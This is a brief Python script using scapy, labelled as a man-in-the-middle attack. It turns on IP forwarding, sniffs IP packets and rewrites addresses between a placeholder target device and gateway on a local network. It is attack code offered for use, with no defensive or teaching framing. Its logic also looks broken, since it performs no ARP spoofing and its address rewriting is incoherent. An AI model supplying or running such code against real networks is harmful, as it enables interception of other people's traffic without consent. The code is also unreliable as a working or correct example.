import os
from scapy.all import *

# Enable IP forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Define the target IP addresses
target_ip = "192.168.0.100"  # Replace with the actual IP address of the target device
gateway_ip = "192.168.0.1"   # Replace with the actual IP address of the gateway

# Define the MITM function
def mitm(packet):
    if packet.haslayer(IP):
        if packet[IP].src == target_ip:
            packet[IP].src = gateway_ip
        elif packet[IP].dst == target_ip:
            packet[IP].dst = gateway_ip
    send(packet, verbose=0)

# Start the MITM attack
try:
    sniff(filter="ip", prn=mitm)
except KeyboardInterrupt:
    pass